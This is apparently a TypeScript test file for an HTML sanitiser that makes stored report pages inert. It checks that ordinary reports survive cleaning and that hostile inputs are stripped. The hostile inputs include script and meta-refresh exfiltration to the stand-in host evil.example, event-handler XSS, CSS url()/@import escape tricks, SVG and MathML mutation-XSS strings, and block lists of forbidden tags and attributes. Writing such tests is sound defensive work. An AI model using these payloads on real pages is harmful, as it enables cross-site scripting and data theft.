import { html as spec, parse, type DefaultTreeAdapterTypes } from "parse5";
import { describe, expect, it } from "vitest";
import { cleanPageHtml, cssIsStatic, MAX_ATTRIBUTES_PER_ELEMENT, MAX_PAGE_DEPTH } from "../src/page-html";

type Node = DefaultTreeAdapterTypes.Node;
type Element = DefaultTreeAdapterTypes.Element;

/** Elements no cleaned page may hold, in any namespace. */
const FORBIDDEN_ELEMENTS = new Set([
	"script", "noscript", "link", "meta", "base", "iframe", "frame", "frameset", "noframes", "object", "embed", "applet", "portal", "fencedframe",
	"form", "input", "button", "select", "option", "textarea", "template", "foreignobject", "image", "use", "feimage", "animate", "set",
	"animatemotion", "animatetransform", "video", "audio", "source", "track", "area", "map", "math", "canvas", "xmp", "plaintext",
]);
const FORBIDDEN_ATTRIBUTES = new Set(["href", "xlink:href", "srcset", "action", "formaction", "ping", "background", "poster", "attributionsrc", "data", "target", "http-equiv"]);

/** The cleaned page as the browser parses it in the frame: nothing forbidden anywhere, and nothing that could load or link. */
function expectInert(html: string): void {
	const visit = (node: Node) => {
		if ("tagName" in node) {
			const element = node as Element;
			const name = element.tagName.toLowerCase();
			expect(FORBIDDEN_ELEMENTS.has(name), `<${name}> in ${html}`).toBe(false);
			expect(element.namespaceURI === spec.NS.HTML || element.namespaceURI === spec.NS.SVG, `<${name}> namespace`).toBe(true);
			for (const attribute of element.attrs) {
				const attributeName = (attribute.prefix ? `${attribute.prefix}:${attribute.name}` : attribute.name).toLowerCase();
				expect(attributeName.startsWith("on"), `${attributeName} in ${html}`).toBe(false);
				expect(FORBIDDEN_ATTRIBUTES.has(attributeName), `${attributeName} in ${html}`).toBe(false);
				if (attributeName === "src") expect(attribute.value).toMatch(/^data:image\/(?:png|jpeg|gif|webp)[;,]/);
				if (attributeName === "style" || element.namespaceURI === spec.NS.SVG) expect(cssIsStatic(attribute.value), `${attributeName}="${attribute.value}"`).toBe(true);
			}
			if (name === "style") expect(cssIsStatic(element.childNodes.map((child) => (child as DefaultTreeAdapterTypes.TextNode).value).join(""))).toBe(true);
		}
		if ("childNodes" in node) node.childNodes.forEach(visit);
	};
	visit(parse(html, { scriptingEnabled: false }));
	expect(html).not.toMatch(/evil\.example/);
}

function cleaned(html: string) {
	const result = cleanPageHtml(html);
	if (result.status !== "ok") throw new Error(`not cleaned: ${result.status}`);
	// Settled: cleaning it again changes nothing.
	expect(cleanPageHtml(result.html)).toEqual({ status: "ok", html: result.html, removed: [] });
	return result;
}

const page = (body: string, head = "") => `<!doctype html><html><head><title>Report</title>${head}</head><body><p>Keep this.</p>${body}</body></html>`;

describe("cleanPageHtml", () => {
	it("keeps an ordinary report: headings, tables, inline styles and CSS, details, data: images and inline SVG charts", () => {
		const report = `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>October spend</title>
<style>
:root { --accent: #0069a8; }
body { font: 15px/1.5 system-ui, sans-serif; margin: 2rem; }
th, td { padding: 4px 8px; border-bottom: 1px solid #e5e7eb; text-align: right; }
.bar { fill: url(#fill); }
.badge { background: url("data:image/png;base64,iVBORw0KGgo=") no-repeat; }
@media (max-width: 600px) { body { margin: 1rem; } }
</style></head>
<body>
<h1>October spend</h1>
<p class="lead" style="color: #374151">Total: <strong>$1,234.50</strong> &mdash; up 12% on September.</p>
<table><caption>By model</caption><thead><tr><th scope="col">Model</th><th scope="col">Spend</th></tr></thead>
<tbody><tr><td>openai/gpt-test</td><td>$800.00</td></tr><tr><td colspan="2" style="font-weight:600">Total $1,234.50</td></tr></tbody></table>
<details open><summary>How this was counted</summary><ul><li>UTC days</li><li>Weeks start on Monday</li></ul></details>
<img alt="logo" width="16" height="16" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==">
<svg viewBox="0 0 200 100" width="200" height="100" role="img" aria-label="Spend by week" xmlns="http://www.w3.org/2000/svg">
<title>Spend by week</title>
<defs><linearGradient id="fill" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#0069a8"/><stop offset="1" stop-color="#7dd3fc"/></linearGradient>
<filter id="shadow"><feGaussianBlur stdDeviation="1"/></filter></defs>
<g transform="translate(10,10)" font-family="system-ui" font-size="10">
<rect class="bar" x="0" y="20" width="30" height="60" fill="url(#fill)" filter="url(#shadow)"/>
<path d="M0 80 L180 80" stroke="#9ca3af" stroke-width="1"/>
<text x="15" y="95" text-anchor="middle">W1</text>
</g></svg>
<!-- a comment -->
</body></html>`;
		const result = cleaned(report);
		expect(result.removed).toEqual([]);
		expectInert(result.html);
		for (const kept of [
			'<html lang="en"><head><title>October spend</title>\n<style>',
			".bar { fill: url(#fill); }",
			'<p class="lead" style="color: #374151">Total: <strong>$1,234.50</strong> — up 12% on September.</p>',
			'<th scope="col">Model</th>',
			'<td colspan="2" style="font-weight:600">Total $1,234.50</td>',
			"<details open=\"\"><summary>How this was counted</summary>",
			'<img alt="logo" width="16" height="16" src="data:image/png;base64,',
			'<svg viewBox="0 0 200 100" width="200" height="100" role="img" aria-label="Spend by week" xmlns="http://www.w3.org/2000/svg">',
			'<linearGradient id="fill" x1="0" x2="0" y1="0" y2="1">',
			'<feGaussianBlur stdDeviation="1"></feGaussianBlur>',
			'<rect class="bar" x="0" y="20" width="30" height="60" fill="url(#fill)" filter="url(#shadow)"></rect>',
			'<text x="15" y="95" text-anchor="middle">W1</text>',
		]) expect(result.html).toContain(kept);
		// A srcdoc document is never in quirks mode: the doctype goes first whatever the page had.
		expect(result.html.startsWith("<!DOCTYPE html><html")).toBe(true);
		expect(result.html).not.toContain("<meta");
		expect(result.html).not.toContain("a comment");
	});

	const hostile: Array<[string, string, string[]]> = [
		["scripts", '<script>location.href = "https://evil.example/?t=" + document.body.innerText</script><script src="https://evil.example/s.js"></script>', ["<script>"]],
		["speculation rules", '<script type="speculationrules">{"prerender":[{"source":"list","urls":["https://evil.example/a"]}]}</script>', ["<script>"]],
		["prerender, prefetch, stylesheet and preconnect links", '<link rel="prerender" href="https://secret-text.evil.example/?t=SECRET"><link rel="prefetch" href="https://evil.example/"><link rel="stylesheet" href="https://evil.example/x.css"><link rel="preconnect" href="https://evil.example"><link rel="dns-prefetch" href="//evil.example">', ["<link>"]],
		["a refresh", '<meta http-equiv="refresh" content="0;url=https://evil.example/?t=SECRET">', ["<meta>"]],
		["a refresh in the head", "", ["<meta>"]],
		["a link with data in its host", '<a href="https://secret-slack-text.evil.example/">Read more</a> <a target="_top" ping="https://evil.example/p" href="javascript:alert(1)">and this</a>', ["href", "ping", "target"]],
		["remote images", '<img src="https://evil.example/i.png?t=SECRET"><img srcset="https://evil.example/s.png 1x"><img src=" https://evil.example/space.png"><img src="data:image/svg+xml,<svg/>">', ["<img>", "src", "srcset"]],
		["a data: image with a remote srcset", '<img alt="chart" src="data:image/png;base64,iVBORw0KGgo=" srcset="https://evil.example/s.png 2x" attributionsrc="https://evil.example/a">', ["attributionsrc", "srcset"]],
		["event handlers", '<p onclick="fetch(\'https://evil.example\')" onmouseover="x()">Hover</p><img src="data:image/png;base64,iVBORw0KGgo=" onerror="location=\'https://evil.example\'" onload="x()">', ["onclick", "onerror", "onload", "onmouseover"]],
		["CSS url() and @import in style attributes", '<div style="background: url(https://evil.example/bg.png)">a</div><div style="background-image: u\\72l(https://evil.example/e.png)">b</div><div style="width: expression(alert(1))">c</div><div style="background: image-set(\'https://evil.example/x.png\' 1x)">d</div><div style="color: red">e</div>', ["style"]],
		["a stylesheet that loads", "<style>body { background: url('https://evil.example/bg.png') }</style><style>@font-face { font-family: x; src: url(https://evil.example/f.woff) }</style><style>.a { background: \\75 rl(https://evil.example/escaped.png) }</style><style>.b { background: u/**/rl(https://evil.example/comment.png) }</style>", ["<style>"]],
		["an @import after other rules", "<style>p { color: red } @import url(https://evil.example/late.css);</style>", ["<style>"]],
		["frames, objects and embeds", '<iframe src="https://evil.example/"></iframe><iframe srcdoc="<script>parent.x()</script>"></iframe><object data="https://evil.example/o"></object><embed src="https://evil.example/e"><portal src="https://evil.example/"></portal><frameset><frame src="https://evil.example/"></frameset>', ["<embed>", "<iframe>", "<object>", "<portal>"]],
		["media", '<video src="https://evil.example/v.mp4" poster="https://evil.example/p.png" autoplay></video><audio src="https://evil.example/a.mp3"></audio><picture><source srcset="https://evil.example/p.webp"><img src="data:image/png;base64,iVBORw0KGgo=" alt="kept"></picture>', ["<audio>", "<source>", "<video>"]],
		["forms", '<form action="https://evil.example/f" method="post"><p>Form text stays.</p><input name="t" value="SECRET"><button formaction="https://evil.example/b">Go</button><select><option>x</option></select><textarea>SECRET</textarea></form>', ["<button>", "<input>", "<select>", "<textarea>"]],
		["base, template and noscript", '<base href="https://evil.example/"><template><img src="https://evil.example/t.png"></template><noscript><link rel="prerender" href="https://evil.example/n"></noscript>', ["<base>", "<noscript>", "<template>"]],
		["backgrounds", '<table background="https://evil.example/t.png"><tr><td background="https://evil.example/td.png">cell</td></tr></table>', ["background"]],
		["SVG scripts, foreign objects, links, images and animations", '<svg viewBox="0 0 10 10"><script>fetch("https://evil.example")</script><foreignObject><iframe src="https://evil.example/"></iframe></foreignObject><a href="https://evil.example/svg" xlink:href="https://evil.example/x"><text>label</text></a><image href="https://evil.example/i.png"/><use href="https://evil.example/u.svg#a"/><feImage href="https://evil.example/f.png"/><a><set attributeName="href" to="https://evil.example/set"/><animate attributeName="href" values="https://evil.example/anim"/><text>more</text></a><rect width="5" height="5" fill="url(https://evil.example/fill.svg#g)" onclick="x()"/></svg>', ["<animate>", "<feImage>", "<foreignObject>", "<image>", "<script>", "<set>", "<use>", "fill", "href", "onclick", "xlink:href"]],
		["SVG styles", '<svg><style>@import url(https://evil.example/s.css); rect { fill: red }</style><style><![CDATA[ rect { fill: url(https://evil.example/c.svg) } ]]></style><rect width="1" height="1"/></svg>', ["<style>", "@import"]],
		["MathML", "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math><math><mi xlink:href=\"https://evil.example/\">x</mi></math>", ["<math>"]],
		["a style closed inside SVG", '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">', ["<img>", "onerror", "src"]],
		["noscript holding markup", '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>', ["<noscript>"]],
		["unknown elements", '<x-chart data-url="https://evil.example" onload="x()"><span>inside stays</span></x-chart><canvas width="10">fallback stays</canvas><marquee>scrolls</marquee>', []],
	];

	for (const [name, body, removed] of hostile) {
		it(`makes ${name} inert`, () => {
			const html = name === "a refresh in the head" ? page("", '<meta http-equiv="refresh" content="0;url=https://evil.example/?t=SECRET">') : page(body);
			const result = cleaned(html);
			expectInert(result.html);
			expect(result.html).toContain("<p>Keep this.</p>");
			for (const item of removed) expect(result.removed, name).toContain(item);
		});
	}

	it("keeps the text of links, forms and unknown elements, and the rest of a stylesheet after its leading @import rules", () => {
		expect(cleaned(page('<a href="https://evil.example/">Read more</a>')).html).toContain("<a>Read more</a>");
		expect(cleaned(page('<form action="https://evil.example/"><p>Form text stays.</p></form>')).html).toContain("<p>Form text stays.</p>");
		expect(cleaned(page("<x-chart><span>inside stays</span></x-chart>")).html).toContain("<p>Keep this.</p><span>inside stays</span>");
		const fonts = cleaned(page("", "<style>/* fonts */ @import url('https://evil.example/css2?family=Inter;wght@400');\n@import \"https://evil.example/b.css\";\nbody { font-family: Inter, sans-serif }</style>"));
		expect(fonts.html).toContain("<style>body { font-family: Inter, sans-serif }</style>");
		expect(fonts.removed).toEqual(["@import"]);
		expectInert(fonts.html);
	});

	it("refuses a page with nothing left to show, or nested too deeply to check", () => {
		for (const html of ["", "   ", "<script>document.write('hi')</script>", '<link rel="stylesheet" href="x.css"><title>Only a title</title><style>p{}</style>', "<!doctype html><html><body><canvas></canvas><button>Go</button></body></html>"]) {
			expect(cleanPageHtml(html), html).toEqual({ status: "empty" });
		}
		expect(cleanPageHtml(`<p>${"<p>".repeat(10)}deep enough</p>`)).toMatchObject({ status: "ok" });
		expect(cleanPageHtml(`${"<div>".repeat(MAX_PAGE_DEPTH + 5)}too deep`)).toEqual({ status: "too_deep" });
		// Elements the browser itself caps (an image is enough to show) are fine.
		expect(cleanPageHtml('<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=">')).toMatchObject({ status: "ok" });
	});

	it("keeps at most 64 attributes per element, so a stored page stays cheap to clean again", () => {
		const attributes = Array.from({ length: 2_000 }, (_, index) => `data-a${index}="x"`).join(" ");
		const page = cleaned(`<p ${attributes}>Spend</p>`);
		const element = parse(page.html, { scriptingEnabled: false }).childNodes[1] as Element;
		const p = (element.childNodes[1] as Element).childNodes[0] as Element;
		expect(p.attrs).toHaveLength(MAX_ATTRIBUTES_PER_ELEMENT);
		expect(page.removed).toContain(`attributes past the first ${MAX_ATTRIBUTES_PER_ELEMENT}`);
	});

	it("doesn't take a comment opener inside a CSS string for a comment", () => {
		expect(cssIsStatic('font-family:"/*";background:url(https://evil.example/a);--x:"*/"')).toBe(false);
		expectInert(cleaned('<p style=\'font-family:"/*";background:url(https://evil.example/a);--x:"*/"\'>Spend</p>').html);
	});

	it("unwraps elements named like built-in object properties", () => {
		expect(cleaned('<constructor data-x="x">text</constructor><tostring>more</tostring>').html).toContain("textmore");
	});

	it("reads CSS as the browser does: escapes, comments, case and whitespace", () => {
		for (const css of ["color: red", "fill: url(#g)", "fill: url( '#g' )", 'background: url("data:image/webp;base64,UklGR")', "font-family: 'Source Sans', sans-serif"]) expect(cssIsStatic(css), css).toBe(true);
		for (const css of [
			"background: url(https://evil.example/)", "background: URL(//evil.example/)", "background: \\75\\72\\6c(https://evil.example/)", "background: u\\rl(x)",
			"@\\69mport 'x.css'", "@IMPORT url(x)", "background: url(data:image/svg+xml,<svg/>)", "background: -webkit-image-set('x.png' 1x)",
			"background: image('x.png')", "mask: cross-fade(url(#a), 'x.png')", "behavior: url(x.htc)", "-moz-binding: url(x)", "width: expression(alert(1))",
			"cursor: url(x.cur), auto", "list-style: url(x.png)", "src: url(x)", "content: src('x.png')",
		]) expect(cssIsStatic(css), css).toBe(false);
	});
});
